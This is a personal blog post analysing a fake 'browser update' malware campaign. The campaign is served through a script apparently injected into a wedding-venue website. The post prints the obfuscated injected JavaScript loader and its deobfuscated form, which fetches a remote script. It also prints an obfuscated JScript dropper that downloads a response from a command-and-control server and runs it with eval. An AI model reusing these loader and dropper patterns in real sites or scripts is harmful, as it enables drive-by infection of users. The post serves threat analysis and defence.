---
layout: post
title: UltimateUpdate
description: What do wedding venues and malware have in common? I got to spend my weekend investigating them. A short post about interesting malware, and lessons learned.
image: https://axelp.io/images/UltimateUpdate/UltimateUpdate.png
excerpt_separator: <!--more-->
categories:
- Reverse Engineering
author:
- Axel Persinger
---

![UltimateUpdate]({{ site.baseurl }}/images/UltimateUpdate/UltimateUpdate.png)

I was on a site browsing for wedding venues in Virginia (👀), and after scrolling down a page listing venues in Vienna, my entire screen changed to one of the typical "Your {Internet Browser} is out of date. Click here to update!". Curiosity got the best of me, I clicked the link, and this created a mini-investigation of some interesting malware!

<!--more-->
I thought it was pretty odd that I was served this ad in the first place, since I have uBlock Origin, which is pretty good at preventing these sorts of ads. Because I have no respect for my computer, I decided to YOLO it and click the "Download Update!" button. It downloaded a ZIP file named `Firefοx.106.63418.18456.9503fcf0.zip` from a JavaScript Blob (URL: `blob:null/06285e4d-82c0-4901-b6c3-f7d713a410a3`). This means I won't be able to re-download it, and unfortunately I navigated away from the page so I don't have the original.

I repackaged the zip file into a 7Zip in this [repo](https://github.com/CuckooEXE/UltimateUpdate) with the password `infected`.

## Hunt for the Original
First thing I want to do for this "investigation" is to see what the original payload is. That way I can see the logic in targetting, or if there are any other payloads. I went back through my browsing history to see if I could eventually find it, and on the page `hxxps[://]www[.]weddingrule[.]com/wedding-venues/virginia/north-va/` I see that it loads a Blob:

```javascript
;(function(){var dq=document.referrer;var ad=window.location.href;var xw=navigator.userAgent;var ej=new RegExp(vz('p:p/z/j(a[c^y/t]c+x)y/x'));if(!dq||ad.match(ej)[1]==dq.match(ej)[1]||xw.indexOf(vz('xWvitnadrobwbsr'))==-1||window.localStorage[vz('k_m_h_suetemmal')]){return;}var kf=vz('usvcxrqizpktc');var ox=document.createElement(kf);ox.async=true;ox.src=vz('shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u');var fq=document.getElementsByTagName(kf)[0];fq.parentNode.insertBefore(ox,fq);function vz(wm){var yo='';for(var ud=0;ud<wm.length;ud++){if(ud%2){yo+=wm[ud];}}return yo;}})();
```

Which, running it through a [deobfuscator](https://deobfuscate.io/), turns into:

```javascript
;
(function () {
  var dq = document.referrer;
  var ad = window.location.href;
  var xw = navigator.userAgent;
  var ej = new RegExp(vz("p:p/z/j(a[c^y/t]c+x)y/x"));
  if (!dq || ad.match(ej)[1] == dq.match(ej)[1] || xw.indexOf(vz("xWvitnadrobwbsr")) == -1 || window.localStorage[vz("k_m_h_suetemmal")]) {
    return;
  }
  var kf = vz("usvcxrqizpktc");
  var ox = document.createElement(kf);
  ox.async = true;
  ox.src = vz("shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u");
  var fq = document.getElementsByTagName(kf)[0];
  fq.parentNode.insertBefore(ox, fq);
  function vz(wm) {
    var yo = "";
    for (var ud = 0; ud < wm.length; ud++) {
      if (ud % 2) {
        yo += wm[ud];
      }
    }
    return yo;
  }
}());
```

This is clearly an attempt to obfuscate what the code is doing, so I'll do the work to "reverse-engineer" this into something that makes more sense:

```javascript

/**
 * @brief Deobfuscates a string
 * @details Takes every other character of the original string
 *
 * @param {string} obfuscated_str Obfuscated string to deobfuscate
 * @returns {string} Deobfuscated string
 */
function deobfuscate_str(obfuscated_str) {
    var deobfuscated_str = "";
    for (var i = 0; i < obfuscated_str.length; i++) {
        if (i % 2) {
            deobfuscated_str += obfuscated_str[i];
        }
    }
    return deobfuscated_str;
}

// Check if any are true, if so return:
//  1. No referrer
//  2. The current page and the referrer both have match the regex "://([^/]+)/"
//  3. The User Agent does *not* have the string "Windows"
//  4. The key "___utma" in the local storage has a "truthy" value
var re = new RegExp(deobfuscate_str("p:p/z/j(a[c^y/t]c+x)y/x") /* ://([^/]+)/ */);
if (
    !document.referrer || window.location.href.match(re)[1] == document.referrer.match(re)[1] || 
    navigator.userAgent.indexOf(deobfuscate_str("xWvitnadrobwbsr") /* Windows */) == -1 || 
    window.localStorage[deobfuscate_str("k_m_h_suetemmal") /* ___utma */]
) {
    return;
}

// 1. Create a <script> element
// 2. Set the element's "async" attribute to "true"
// 3. Set the element's "src" attribute to "hxxps[://]training[.]c1ypsilanti[.]org/report?r=dj01MDY1NDg3MTIwZTU2ZmQ1ZTZlNCZjaWQ9MjY0"
// 4. Get all elements with the tag "<script>"
// 5. Insert the newly created element above that
var script_str = deobfuscate_str("usvcxrqizpktc") /* script */;
var script_elem = document.createElement(script_str);
script_elem.async = true;
script_elem.src = deobfuscate_str("shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u") /* hxxps[://]training[.]c1ypsilanti[.]org/report?r=dj01MDY1NDg3MTIwZTU2ZmQ1ZTZlNCZjaWQ9MjY0 */;
var script_elem_ = document.getElementsByTagName(script_str)[0];
script_elem_.parentNode.insertBefore(script_elem, script_elem_);
```

I tried visiting the site, and nothing appeard. I am able to consistently trigger the `<script>` element, but the webserver isn't returning anything new for me. Their webserver must be doing some sort of filtering based on referrer, or potentially using the Base64-encoded parameter as a nonce. To rule out any IP-based filtering, I downloaded a VPN to see if I get a "new IP" and try from there. Unfortunately, I got the `<script>` tag added again, but still no response. 

I ran their site through [VirusTotal](https://www.virustotal.com/gui/url/4023d8e5092e1f3ecb943e1d8d8e6a7c907bfb51243d43d874a6f48decd35aeb/details), which returned with two hits (Avira and Kaspersky both claiming the site hosts Malware); all other scanners labelled this clean. Unsurprising, this domain was registered with privacy settings through FastDomain. It was registered on 02/01/2022, last updated on 06/14/2022.

I went to the parent domain, and it's masquerading as a WordPress site that's "Coming Soon". Interestingly enough, the title is "Church One Ypsilanti", of which, there is a real one! However, their domain is `https://churchoneypsilanti.org/`. The email associated with the church's FaceBook page is `c1ypsilanti[@]gmail[.]com` which is the same spelling as the masqueraded domain.

The entire situation is pretty weird; typically, if this were just adware, they wouldn't care about serving the same client twice. That just means double the chances of landing a victim. However, there was a semi-professional attempt at preventing serving the same client multiple times for this domain. Let's take a step back and look at some facts:

 - There is a church in Ypsilanti, MI called "Church One Ypsilanti", with a domain of `churchoneypsilanti.org` and email of `c1ypsilanti@gmail.com`
 - Someone registered a domain `c1ypsilanti[.]org`, which is the valid __email__ of the Church One Ypsilanti team
 - They aged the domain for about half a year
 - The root domain hosts a legitimate looking "Coming Soon" WordPress site
 - Someone infected a website, `weddingrule[.]org` to serve an infected JavaScript blob
 - This JavaScript blob is obfuscated
 - The JavaScript blob only redirects to the malicious domain if it hasn't done that in the past (it will add a `__utma` key in your local storage)
 - Even after manually removing traces of the `__utma` key, and trying to re-trigger the malicious site's content, the malicious site only returns an empty page.

 This is all pretty odd...

 Another route I want to take is see how the blob originally gets created and called from the acutal site. We'll go back into Chrome Dev Tools to check this out. I searched for a unique string (`shntitiphss`) that was inside of the blob to see where it appeared on the wedding webpage. The blob is wrapped in a `<script>` tag:

 ```html
<script id="6049c9e9056fa8c121a67cbec179fdac-1" type="nitropack/inlinescript" class="nitropack-inline-script">
  ...
</script>
```

It looks like this `nitropack` is a CDN that allows you to register "plugins" (i.e. the Google Analytics script snippet), that will dynamically add the scripts in when the page loads. It is unlikely that all of `weddingrule[.]org` was compromised, but rather, there is a supply chain attack against the original script that is hosted in NitroPack at the `6049c9e9056fa8c121a67cbec179fdac-1` ID.

I tried registering for an account on `nitropack` thinking that it would allow me to see what plugins they have, and potentially view the IDs for them, but no such luck. It seems that the process is much more involved.


## Inspecting the Payload
Unfortunately, I don't think there's much I can do to get the webserver to respond to me with a new payload, or trigger the pop-up again. I might go back on another computer and fudge around with it a bit later. I still have the original payload, so I'll keep going down that path.

The only contents of the directory is a JavaScript file titled `Installer.106.77570.17215.ded29e4a.js`. It's heavily obfuscated again, so I executed most of it, just making sure that it doesn't do anything dangerous on my machine.

Here is the original (unrolled, but still obfuscated):
```javascript
function a0_0x219ccd(_0x35b93c, _0x207fb7) {
    var a0_0x17ddf8 = {
        _0x37821e: 0x15b
    };
    return a0_0x340a(_0x207fb7 - a0_0x17ddf8._0x37821e, _0x35b93c);
}

function a0_0xb56377(_0x43919e, _0x5b2869) {
    var a0_0x4b5ec = {
        _0x147571: 0x28d
    };
    return a0_0x340a(_0x5b2869 - a0_0x4b5ec._0x147571, _0x43919e);
}(function(_0x199181, _0x1464cd) {
    var a0_0x190e3b = {
            _0x42c655: 0x52,
            _0xa6b46f: 0x47,
            _0x2fd595: 0x2f,
            _0x1063d2: 0x24,
            _0x243ed1: 0x4b,
            _0x4ed0d9: 0x58,
            _0x283732: 0x4d,
            _0x208eff: 0x48,
            _0x46226d: 0x365,
            _0x2af4b2: 0x359,
            _0x255e64: 0x17d,
            _0x221017: 0x16a,
            _0x2876e1: 0xf6,
            _0x33eac0: 0xf7,
            _0xabf493: 0xe7,
            _0x5f06bc: 0xd5,
            _0x50ef72: 0x49,
            _0xd73765: 0x56
        },
        a0_0x506224 = {
            _0x4ed62a: 0x4f
        },
        a0_0xda6dc1 = {
            _0x9031ba: 0x3c6
        },
        a0_0x1cd518 = {
            _0x41d223: 0x2c3
        },
        a0_0x481136 = {
            _0x5afa56: 0x225
        },
        a0_0x32bd19 = {
            _0x422ecf: 0x2c
        },
        a0_0x2796f4 = {
            _0x15c577: 0x23f
        },
        a0_0x89a3e = {
            _0x4b64b2: 0x52
        },
        a0_0x2b8906 = {
            _0x21a701: 0x31a
        },
        a0_0x46b232 = {
            _0x348b35: 0x207
        };

    function _0x557417(_0x126f61, _0x48436b) {
        return a0_0x340a(_0x48436b - -a0_0x46b232._0x348b35, _0x126f61);
    }
    var _0x3083f2 = _0x199181();

    function _0x5aaee4(_0x57ae9d, _0x30086e) {
        return a0_0x340a(_0x30086e - -a0_0x2b8906._0x21a701, _0x57ae9d);
    }

    function _0x14143f(_0xc96aa1, _0x10686a) {
        return a0_0x340a(_0xc96aa1 - a0_0x89a3e._0x4b64b2, _0x10686a);
    }

    function _0x1557b9(_0x6a6c78, _0x32fb49) {
        return a0_0x340a(_0x6a6c78 - a0_0x2796f4._0x15c577, _0x32fb49);
    }

    function _0xd9a442(_0x4f9ead, _0x51cb90) {
        return a0_0x340a(_0x51cb90 - -a0_0x32bd19._0x422ecf, _0x4f9ead);
    }

    function _0x10de0b(_0x48b014, _0x1d314d) {
        return a0_0x340a(_0x48b014 - -a0_0x481136._0x5afa56, _0x1d314d);
    }

    function _0x103d48(_0x3ee4c, _0x33bfb4) {
        return a0_0x340a(_0x33bfb4 - a0_0x1cd518._0x41d223, _0x3ee4c);
    }

    function _0x1cbab1(_0x17dbb5, _0x556590) {
        return a0_0x340a(_0x17dbb5 - -a0_0xda6dc1._0x9031ba, _0x556590);
    }

    function _0x368ce8(_0x1f8554, _0x48978a) {
        return a0_0x340a(_0x1f8554 - -a0_0x506224._0x4ed62a, _0x48978a);
    }
    while (!![]) {
        try {
            var _0x1fd2d1 = -parseInt(_0x368ce8(a0_0x190e3b._0x42c655, a0_0x190e3b._0xa6b46f)) / (0x1 * 0x2395 + -0x1dd3 + 0x3 * -0x1eb) + parseInt(_0x368ce8(a0_0x190e3b._0x2fd595, a0_0x190e3b._0x1063d2)) / (0x1948 + -0x1ecb + -0x1 * -0x585) * (parseInt(_0x368ce8(a0_0x190e3b._0x243ed1, a0_0x190e3b._0x4ed0d9)) / (-0xb5b + 0x60 * 0x2 + -0x54f * -0x2)) + parseInt(_0x368ce8(a0_0x190e3b._0x283732, a0_0x190e3b._0x208eff)) / (-0x3 * 0x184 + 0x14c5 + -0x1035) + -parseInt(_0x103d48(a0_0x190e3b._0x46226d, a0_0x190e3b._0x2af4b2)) / (-0x1a34 + -0x1 * 0x69d + 0x20d6 * 0x1) + parseInt(_0x557417(-a0_0x190e3b._0x255e64, -a0_0x190e3b._0x221017)) / (-0xae * 0x1e + 0x1f0a + -0xaa0) + parseInt(_0x14143f(a0_0x190e3b._0x2876e1, a0_0x190e3b._0x33eac0)) / (0x213 * -0x2 + 0x1 * -0x18ea + 0x1 * 0x1d17) * (parseInt(_0x14143f(a0_0x190e3b._0xabf493, a0_0x190e3b._0x5f06bc)) / (0xfa0 + -0x1f5e + 0xfc6 * 0x1)) + parseInt(_0x368ce8(a0_0x190e3b._0x50ef72, a0_0x190e3b._0xd73765)) / (0x1f7a * -0x1 + -0x7 * -0x431 + 0x22c);
            if (_0x1fd2d1 === _0x1464cd) break;
            else _0x3083f2['push'](_0x3083f2['shift']());
        } catch (_0x2b266f) {
            _0x3083f2['push'](_0x3083f2['shift']());
        }
    }
}(a0_0x1590, 0x59efc + 0xa0c02 + -0xa76d2));
var a0_0x1bbfc1 = a0_0x4e8ff2(0x38, 0x36) + a0_0x3be92f(-0x26b, -0x27b) + a0_0x4e8ff2(0x4e, 0x3c),
    a0_0x2d5b8b = a0_0x4152c3(0x53, 0x41) + a0_0x3be92f(-0x24f, -0x257) + a0_0xb56377(0x317, 0x30d),
    a0_0x5259a4 = new this[a0_0x1bbfc1](a0_0x2d5b8b);

function a0_0x4152c3(_0x4a2099, _0x268b28) {
    var a0_0x563129 = {
        _0x4d0092: 0x45
    };
    return a0_0x340a(_0x268b28 - -a0_0x563129._0x4d0092, _0x4a2099);
}

function a0_0x312db7(_0x46c7dc, _0x571d0a) {
    var a0_0x528e19 = {
        _0x134c68: 0x62
    };
    return a0_0x340a(_0x571d0a - -a0_0x528e19._0x134c68, _0x46c7dc);
}
var a0_0x22ec1e = a0_0x4152c3(0x38, 0x48);

function a0_0x260d79(_0x363819, _0x42a44d) {
    var a0_0xe96931 = {
        _0x3df615: 0x251
    };
    return a0_0x340a(_0x363819 - a0_0xe96931._0x3df615, _0x42a44d);
}

function a0_0x340a(_0x51af3c, _0x54e45b) {
    var _0x455fb2 = a0_0x1590();
    return a0_0x340a = function(_0x5611bb, _0x5b1da5) {
        _0x5611bb = _0x5611bb - (-0xf79 + 0x1 * -0x2133 + 0x312a);
        var _0xb49150 = _0x455fb2[_0x5611bb];
        if (a0_0x340a['pCwxVT'] === undefined) {
            var _0x4f072f = function(_0x3d947e) {
                var _0x4e8bc8 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                var _0xa1b63d = '',
                    _0x7695ae = '';
                for (var _0x2a3374 = -0x1ba6 * -0x1 + -0x1998 + -0x20e, _0x5c5f82, _0x2cf737, _0x21d457 = 0x1c66 * 0x1 + -0xa76 + -0x11f0; _0x2cf737 = _0x3d947e['charAt'](_0x21d457++); ~_0x2cf737 && (_0x5c5f82 = _0x2a3374 % (0x507 + -0x41b + -0xe8) ? _0x5c5f82 * (0x2be + 0x6 * 0x6f + -0x518) + _0x2cf737 : _0x2cf737, _0x2a3374++ % (0x33e + 0x21fc + -0x2536)) ? _0xa1b63d += String['fromCharCode'](0x267b + 0x1b87 + -0x4103 & _0x5c5f82 >> (-(0x3 * 0x1c1 + -0x134e + 0xe0d) * _0x2a3374 & 0x9 * -0x135 + -0x33 + 0xb16)) : -0x2 * 0x6bb + 0x1e9 * 0xb + -0x1 * 0x78d) {
                    _0x2cf737 = _0x4e8bc8['indexOf'](_0x2cf737);
                }
                for (var _0x309b2b = 0x19 * 0x25 + -0x12aa * 0x1 + 0xf0d, _0x176b4c = _0xa1b63d['length']; _0x309b2b < _0x176b4c; _0x309b2b++) {
                    _0x7695ae += '%' + ('00' + _0xa1b63d['charCodeAt'](_0x309b2b)['toString'](-0x19 * 0x115 + 0x13 * 0x134 + 0x441 * 0x1))['slice'](-(0xa5b + -0x5 * 0x81 + -0x7d4));
                }
                return decodeURIComponent(_0x7695ae);
            };
            a0_0x340a['hWUEho'] = _0x4f072f, _0x51af3c = arguments, a0_0x340a['pCwxVT'] = !![];
        }
        var _0x31a990 = _0x455fb2[0xa8b * 0x3 + 0x1 * 0x1d13 + -0x3cb4],
            _0x1073b2 = _0x5611bb + _0x31a990,
            _0x59ec02 = _0x51af3c[_0x1073b2];
        return !_0x59ec02 ? (_0xb49150 = a0_0x340a['hWUEho'](_0xb49150), _0x51af3c[_0x1073b2] = _0xb49150) : _0xb49150 = _0x59ec02, _0xb49150;
    }, a0_0x340a(_0x51af3c, _0x54e45b);
}

function a0_0x5c2d53(_0x254aa9, _0x37e86d) {
    var a0_0x2d5699 = {
        _0x13cb02: 0x3d
    };
    return a0_0x340a(_0x37e86d - -a0_0x2d5699._0x13cb02, _0x254aa9);
}
var a0_0x4501bd = a0_0x312db7(0x26, 0x23),
    a0_0x5a8906 = a0_0x4152c3(0x39, 0x49) + a0_0x4152c3(0x36, 0x3d) + a0_0x5c2d53(0x46, 0x4a) + a0_0x312db7(0x4d, 0x39) + a0_0x4152c3(0x39, 0x3f) + a0_0x4152c3(0x47, 0x5b) + a0_0x5c2d53(0x61, 0x5c) + a0_0x312db7(0x3a, 0x2f) + a0_0x5c2d53(0x73, 0x61) + a0_0x260d79(0x2e4, 0x2e8) + a0_0x5c2d53(0x65, 0x6a) + a0_0xb56377(0x30a, 0x316);
a0_0x5259a4[a0_0x22ec1e](a0_0x4501bd, a0_0x5a8906, ![]);
var a0_0x1db05b = a0_0x219ccd(0x1e0, 0x1f2);

function a0_0x3be92f(_0x19ef89, _0x1b1820) {
    var a0_0x36a3e7 = {
        _0x666351: 0x2ee
    };
    return a0_0x340a(_0x19ef89 - -a0_0x36a3e7._0x666351, _0x1b1820);
}

function a0_0x1590() {
    var _0x54aa6f = ['zwn0', 'BNnLvgu', 'mZi3otvyr3LOuNm', 'zLe9pq', 'CMvZCg8', 'yxHuAw0', 'mZe5ndb5BNn6uKO', 'CwPgqLa', 'sfruua', 'whDgDvy', 'oI8Vmwu', 'zvHpyMO', 'Bc5IBgu', 'ue9tva', 'tvnytuW', 'nwmUAw4', 'C1fpqZy', 'zw91Da', 'zxzHBa', 'vNbXr3q', 'qwn0Axy', 'B3bLBG', 'Ahr0Chm', 'B3q0kZG', 'EJbMCxO', 'ywXHBg0', 'uujIngC', 'B20VywO', 'A0Lwq0e', 'mZC2yLzuu1fw', 'mZa5odKXnuPls2DNAa', 'C2vUza', 'mZaZnJCXn0vVu1vmvq', 'B29KC2G', 'owrWCK5gCW', 'DgvYBMe', 'mtGXnZy4uLfkD0nU', 'mZiZnte1mLbmBLHirG', 'zwf0lMm', 'mI5ytuW', 'C3nLzgy', 'mJi5mZmZBgjeBKvh'];
    a0_0x1590 = function() {
        return _0x54aa6f;
    };
    return a0_0x1590();
}
var a0_0x1562fb = a0_0x4152c3(0x3b, 0x3a) + a0_0x2177ce(0x2f9, 0x309) + a0_0x3813df(-0x13a, -0x134) + a0_0x4e8ff2(0x3c, 0x3a) + a0_0x260d79(0x2e0, 0x2f1) + a0_0x219ccd(0x1f7, 0x1ed) + a0_0x3be92f(-0x266, -0x25a) + a0_0x312db7(0xa, 0x1f) + a0_0x5c2d53(0x6b, 0x68);
a0_0x5259a4[a0_0x1db05b](a0_0x1562fb);
var a0_0x35d339 = a0_0xb56377(0x308, 0x317);

function a0_0x3813df(_0x2ec6b2, _0x13fab8) {
    var a0_0x31b991 = {
        _0x2c5813: 0x1c5
    };
    return a0_0x340a(_0x2ec6b2 - -a0_0x31b991._0x2c5813, _0x13fab8);
}

function a0_0x4e8ff2(_0x28f744, _0x3ece8b) {
    var a0_0x136d26 = {
        _0x117216: 0x54
    };
    return a0_0x340a(_0x28f744 - -a0_0x136d26._0x117216, _0x3ece8b);
}
var a0_0x2aad8d = a0_0x312db7(0x4d, 0x44) + a0_0x219ccd(0x1f8, 0x1fe) + 'xt';

function a0_0x2177ce(_0x3d89be, _0x3cb99a) {
    var a0_0x592702 = {
        _0x871279: 0x275
    };
    return a0_0x340a(_0x3cb99a - a0_0x592702._0x871279, _0x3d89be);
}
var a0_0x25de01 = a0_0x5259a4[a0_0x2aad8d];
this[a0_0x35d339](a0_0x25de01);
```

And here is what it boils down to:
```javascript
var req = new this['ActiveXObject']('MSXML2.XMLHTTP');
req['open']('POST', "hxxps[://]1e5c[.]internal[.]blessedfoodshalalmeat[.]com/ajaxTimeout", false);
req['send']("qjFBPkIVCAVpqGtz0fqzot4+8QBb4gsQOC6XwFuVfQ==");
var response = req['responseText'];
eval(response);
```

I modified the `eval` to be a `WScript.Echo` command and executed it, because... YOLO, right?

Unfortunately, because I lack foresight, I accidentally clicked the "OK." on the prompt that popped up and only saw the next stage payload appear for a minute. Then it was gone into the ether. I tried executing the script again, but much like the original ad I was served, it isn't re-downloading the payload. This is super disappointing because I saw that the code was executing some WMIC commands and performing a host survey to send back to the C2.

The next day, I re-flashed my laptop with a fresh installation of Windows, went to a coffee shop and tried again. I was able to get the malicious blob served to me from the first site, however, it didn't transition into the malicious "Updated needed!" page. I went ahead and tried executing the last payload I had (the `ActiveXObject` downloader), but I was getting a weird error (`.\bad.js(3, 1) msxml3.dll: The system cannot locate the resource specified.`). After some googling to figure this out, I realized it's telling me that it can't resolve the DNS for the malicious domain. At first I thought it might be the coffee shop WiFi doing some filtering, but after using an online NS lookup tool, I realized that the DNS records were deleted some time last night. This must have been in response to the next stage having been downloaded. It's unclear whether deleting the DNS records was automatic or manual.

## Conclusion
This was a pretty weird series of events. I'm not sure what type of adversary this was. It was too advanced to be "spray-and-pray" adware, as they took down infrastructure and masqueraded with reasonable domains. I doubt it was anything targetted, because I'm a nobody, they didn't use any 0days, and dropping `.js` hoping that I would execute it is a big leap. So, I'm thinking it's somewhere in the middle, an adversary that doesn't target, but invests in reasonable tooling and obfuscation.

I did get to take away a decent lessons learned: always enable logging and take things more slowly during an investigation, even when the investigation is just for fun on my own time. When I used to work in cybersecurity analytics/threat hunt/incident response, I had a good set up with a lot of logging running. This most likely would have saved my bacon by capturing the output of the malicious JavaScript. However, since this was just a hobby "investigation", I didn't take it as seriously, and missed out on what could have been a much deeper rabbit hole!
